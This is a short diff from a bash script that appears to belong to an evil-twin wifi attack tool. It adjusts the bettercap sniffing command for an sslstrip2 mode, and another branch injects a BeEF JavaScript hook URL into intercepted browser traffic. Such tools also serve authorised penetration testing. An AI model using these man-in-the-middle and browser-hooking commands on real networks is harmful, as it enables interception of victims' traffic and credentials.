@@ -11337,7 +11337,7 @@ function launch_bettercap_sniffing() {
 		fi
 
 		if [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
-			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module --dns-port ${bettercap_dns_port}"
+			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --dns-port ${bettercap_dns_port}"
 		else
 			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
 		fi
